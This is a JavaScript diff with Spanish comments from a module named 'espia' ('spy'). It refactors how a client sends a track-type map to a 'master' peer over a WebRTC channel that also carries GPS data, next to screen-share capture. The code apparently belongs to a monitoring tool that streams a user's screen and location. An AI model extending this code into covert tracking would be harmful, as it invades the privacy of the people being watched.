@@ -2551,11 +2551,9 @@ const Session = (() => {
                   return;
                 }
                 window._espiaCliWH.streams.display = screen;
-                // [v2.13.81] Mapping trackId → tipo para que master identifique.
-                // Lo enviaremos por gpsCh en cuanto el channel esté open.
                 window._espiaCliWH._trackTipoMap = window._espiaCliWH._trackTipoMap || {};
                 screen.getTracks().forEach(t => {
-                  if (t.kind === 'video') t.contentHint = 'detail'; // pantalla = detail
+                  if (t.kind === 'video') t.contentHint = 'detail';
                   window._espiaCliWH._trackTipoMap[t.id] = 'pantalla';
                   const sender = pc.addTrack(t, screen);
                   // [v2.13.75 BLINDAJE] removeTrack al detener compartir → master
@@ -2581,6 +2579,9 @@ const Session = (() => {
                 if (window._espiaCliWH?._crearBufferPara) {
                   window._espiaCliWH._crearBufferPara('display');
                 }
+                // [v2.13.82] Reenviar map al master apenas pantalla esté en el peer.
+                // No esperamos timeout; el master se entera al instante.
+                window._espiaCliWH?._enviarTrackMap?.();
               } catch(eS) { console.warn('[espia WH] pantalla rechazada o falló:', eS.message); }
             })();
           } else {
@@ -2588,24 +2589,24 @@ const Session = (() => {
           }
           const gpsCh = pc.createDataChannel('gps');
           window._espiaCliWH.gpsCh = gpsCh;
-          gpsCh.onopen  = () => {
+          // [v2.13.82] Helper expuesto para reenviar el map cuando _trackTipoMap
+          // cambia (ej. addTrack de pantalla post-reneg). Event-driven en vez
+          // de timeouts fijos que no cubren si el user demora >5s en aceptar.
+          window._espiaCliWH._enviarTrackMap = () => {
+            const ref = window._espiaCliWH;
+            if (!ref || !ref.gpsCh || ref.gpsCh.readyState !== 'open') return;
+            try {
+              ref.gpsCh.send(JSON.stringify({
+                __meta: 'trackMap',
+                map: ref._trackTipoMap || {}
+              }));
+            } catch(_){}
+          };
+          gpsCh.onopen = () => {
             console.log('[espia WH gps] DataChannel abierto');
-            // [v2.13.81] Enviar mapping trackId→tipo apenas el channel abra.
-            // Reintentamos cada 800ms hasta confirmar (display puede llegar tarde).
-            const enviarMap = () => {
-              const ref = window._espiaCliWH;
-              if (!ref || gpsCh.readyState !== 'open') return;
-              try {
-                gpsCh.send(JSON.stringify({
-                  __meta: 'trackMap',
-                  map: ref._trackTipoMap || {}
-                }));
-              } catch(_){}
-            };
-            enviarMap();
-            // Reenvío 2s después por si llegó display tarde
-            setTimeout(enviarMap, 2000);
-            setTimeout(enviarMap, 5000);
+            window._espiaCliWH?._enviarTrackMap();
+            // Reenvío preventivo por si la pantalla está en flight justo ahora
+            setTimeout(() => window._espiaCliWH?._enviarTrackMap(), 1500);
           };
           gpsCh.onerror = e => console.warn('[espia WH gps] DataChannel error:', e?.message);
           // [v2.13.71] GPS strategy: 2-pass. Primero pedir posición rápida (IP/WiFi,
